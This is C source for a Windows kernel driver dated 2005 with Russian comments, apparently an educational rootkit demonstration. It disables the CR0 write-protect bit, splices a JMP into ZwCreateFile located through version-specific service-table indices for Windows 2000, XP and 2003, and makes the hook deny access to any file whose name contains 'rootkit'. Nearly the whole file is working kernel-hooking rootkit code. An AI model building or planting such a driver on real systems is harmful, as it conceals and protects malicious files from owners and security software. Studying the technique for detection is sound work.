// (С) Зайцев Олег, 2005
#include "StdAfx.h"
#include <ntddk.h>
#include <ntdef.h>
#include <rkdrv.h>

// Глобальные переменные - указатели на объекты "Устройство" и "Контекст устройства"
PDEVICE_OBJECT  gpDeviceObject  = NULL;
PDEVICE_CONTEXT gpDeviceContext = NULL;

extern "C" {
	// Указатель на SDT
	extern PSERVICE_DESCRIPTOR_TABLE    KeServiceDescriptorTable;

	// Номер сборки NT - для анализа
	extern  PWORD						NtBuildNumber;
}


 // Структура, описывающая перехватчик
#pragma pack(1)
struct TInterceptInfo {
	PCHAR   FunctionAddr; // Адрес функции
	PCHAR    HookAddr;     // Адрес функции-перехватчика
    UCHAR   FunctCode[5]; // Первые байты кода функции
    UCHAR   HookJMP[5];   // Код команды JMP на функцию-перехватчик
};
#pragma pack()

TInterceptInfo ZwCreateFileInfo;

VOID SetHookCode(TInterceptInfo InterceptInfo, BOOL ASetHook)
{
 DWORD OldCR0;	
 // Сброс WP бита
_asm {
    mov eax,CR0 
    mov OldCR0,eax
    and eax,0xFFFEFFFF			
    mov cr0, eax
 }

 if (ASetHook)
  memcpy(InterceptInfo.FunctionAddr, &InterceptInfo.HookJMP[0], 5);
 else
  memcpy(InterceptInfo.FunctionAddr, &InterceptInfo.FunctCode[0], 5);
 // Восстановление WP бита
 _asm {
	 mov eax,OldCR0		
     mov cr0,eax
 }
}

NTSTATUS MyZwCreateFile(
    OUT PHANDLE  FileHandle,
    IN ACCESS_MASK  DesiredAccess,
    IN POBJECT_ATTRIBUTES  ObjectAttributes,
    OUT PIO_STATUS_BLOCK  IoStatusBlock,
    IN PLARGE_INTEGER  AllocationSize  OPTIONAL,
    IN ULONG  FileAttributes,
    IN ULONG  ShareAccess,
    IN ULONG  CreateDisposition,
    IN ULONG  CreateOptions,
    IN PVOID  EaBuffer  OPTIONAL,
    IN ULONG  EaLength
    )
{
 
   DbgPrint("%ws \n", ObjectAttributes->ObjectName->Buffer);
   // Блокировка доступа к файлу, содержащему строку "rootkit"
   if (wcsstr(ObjectAttributes->ObjectName->Buffer, L"rootkit") != NULL) {
	   DbgPrint("Lock file !!!!\n");
	   return STATUS_ACCESS_DENIED;
   }
   // Вызов исходной функции
   NTSTATUS Res;
   // Повышение приоритета
//   KIRQL OldIRQL = KeRaiseIrqlToDpcLevel();			 
   // Восстановление машинного кода функции
   SetHookCode(ZwCreateFileInfo, false);
   // Вызов функции
   Res = ZwCreateFile(FileHandle, DesiredAccess, ObjectAttributes, 
	  IoStatusBlock, AllocationSize, FileAttributes, ShareAccess,
	  CreateDisposition, CreateOptions, EaBuffer, EaLength);
   // Установка кода JMP в начало функции
   SetHookCode(ZwCreateFileInfo, true);
   // Восстановление приоритета
  // KeLowerIrql(OldIRQL);
   return Res;
}

VOID InterceptFunction(TInterceptInfo& InterceptInfo, PCHAR HookAddr)
{
 // Повышение приоритета
 KIRQL OldIRQL = KeRaiseIrqlToDpcLevel();	
 // Запоминаем адрес функции-перехватчика
 InterceptInfo.HookAddr = HookAddr;
 // Подготовка команды JMP в буфере HookJMP
 DWORD JMP_Rel = (DWORD)InterceptInfo.HookAddr - ((DWORD)InterceptInfo.FunctionAddr + 5);
 InterceptInfo.HookJMP[0] = 0xE9;
 memcpy(&InterceptInfo.HookJMP[1], &JMP_Rel, 4);
 // Копирование машинного кода перехватываемой функции в FunctCode
 memcpy(&InterceptInfo.FunctCode[0], InterceptInfo.FunctionAddr, 5);
 // Перехват
 SetHookCode(InterceptInfo, true);
 // Восстановление приоритета
 KeLowerIrql(OldIRQL);
}


VOID DeleteKiSTHook()
{
 // Повышение приоритета
 KIRQL OldIRQL = KeRaiseIrqlToDpcLevel();			 
 // Восстановление машинного кода перехваченной функции
 SetHookCode(ZwCreateFileInfo, false);
 // Восстановление приоритета
 KeLowerIrql(OldIRQL);
}


// ***** Выгрузка драйвера *****
void DriverUnload (PDRIVER_OBJECT pDriverObject)
{
 DeleteKiSTHook();
 return;
}

// ***** Точка входа в драйвер *****
NTSTATUS DriverEntry(IN PDRIVER_OBJECT pDriverObject, IN PUNICODE_STRING pusRegistryPath)
{
	// Определение адреса функции ZwCreateFile по KiST
	ZwCreateFileInfo.FunctionAddr = NULL;
	switch (*NtBuildNumber) {
     case  2195:  // Win 2k
      ZwCreateFileInfo.FunctionAddr = (PCHAR)*KeServiceDescriptorTable->ntoskrnl.ServiceTable[0x20];	 
	  break;
     case 2600:   // Win XP
      ZwCreateFileInfo.FunctionAddr = (PCHAR)*KeServiceDescriptorTable->ntoskrnl.ServiceTable[0x25];	 
	  break;
     case 3790:  // W2K3
      ZwCreateFileInfo.FunctionAddr = (PCHAR)*KeServiceDescriptorTable->ntoskrnl.ServiceTable[0x27];	 
	  break;
	}	
	// Адрес не определен ? Тогда выход
	if (ZwCreateFileInfo.FunctionAddr == NULL)
		return STATUS_NOT_SUPPORTED;
	// Установка перехватчика
	InterceptFunction(ZwCreateFileInfo, (PCHAR)*MyZwCreateFile);
    // Подключение обработчика выгрузки драйвера
    pDriverObject->DriverUnload  = DriverUnload;
	// Возврат результата инициализации
    return STATUS_SUCCESS;
}